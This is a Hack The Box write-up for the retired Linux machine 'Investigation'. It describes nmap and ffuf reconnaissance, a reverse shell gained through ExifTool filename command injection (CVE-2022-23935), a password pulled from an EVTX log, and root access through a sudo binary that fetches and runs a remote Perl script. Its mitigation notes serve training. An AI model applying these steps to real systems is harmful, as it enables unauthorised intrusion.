---
machine: Investigation
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, exiftool, cve-2022-23935, evtx, reversing, perl]
---

# Investigation — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

A forensics portal runs ExifTool 12.37 on uploaded images. CVE-2022-23935 injects commands through the filename and yields `www-data`; an accessible EVTX record reveals `smorton`'s password. `sudo binary` downloads a URL and runs it with Perl as root, completing the escalation.

## Reconnaissance

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sCV -p22,80 <IP>
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://<IP>/FUZZ
```

## Enumeration

- The site accepts image uploads and builds a report with ExifTool 12.37.
- Reports are stored in `/var/www/html/reports` and are accessible.
- A Windows EVTX file and `smorton` files are present on the system.

## Initial access

Upload an image whose filename contains shell metacharacters; ExifTool interprets them when building the command and runs a reverse shell as `www-data`. Copy the EVTX and parse it with `evtx_dump.py` or `strings` to recover `smorton`'s password, valid over SSH.

## Privilege escalation

`sudo -l` allows `/usr/bin/binary`. The binary requires two arguments, checks it runs as root and that the second is `lDnxUysaQn`; it downloads the first argument into that file and runs `perl ./lDnxUysaQn`. Host a Perl reverse shell and call `sudo binary <URL> lDnxUysaQn`.

## Evidence

- Filename injection and the `www-data` connection.
- EVTX containing `smorton`'s password.
- `binary` fetching `shell.pl` and the root shell.

## Lessons learned

- Tools that build commands from filenames are dangerous.
- Forensic artifacts can contain credentials.
- A root binary that downloads and executes content is a direct door.

## Mitigation and detection

- Update ExifTool and pass arguments safely.
- Restrict EVTX access and rotate credentials.
- Do not let a sudo binary download and execute arbitrary content.

## References

- [0xdf — Investigation](https://0xdf.gitlab.io/2023/04/22/htb-investigation.html)
- [IppSec — Investigation](https://www.youtube.com/watch?v=X5hVEuWmehk)
- [Hack The Box — Investigation](https://app.hackthebox.com/machines/investigation)
